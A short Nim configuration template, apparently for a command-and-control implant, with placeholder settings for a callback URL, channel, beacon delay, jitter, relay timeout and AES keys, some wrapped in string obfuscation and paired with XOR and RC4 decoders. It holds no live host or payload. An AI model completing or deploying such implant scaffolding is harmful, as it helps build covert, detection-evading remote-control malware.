const obfuscationType* = "<obfuscationType>"

from crypt/xordec import fromXor
from crypt/rc4 import fromRC4
include "../macro"

var channel* = obf("<channel>")
var url* = obf("<url>")
var hostTag* = obf("<hostTag>")
var beaconDelay* = 867530903
var jitter* = 867530902
var relayTimeout* = 5 * 60 * 1000
var pipelineTarget* = obf("<pipelineTarget>")
var aesKey* = "<aesKey>"
var aesRelayKey* = "<aesRelayKey>"
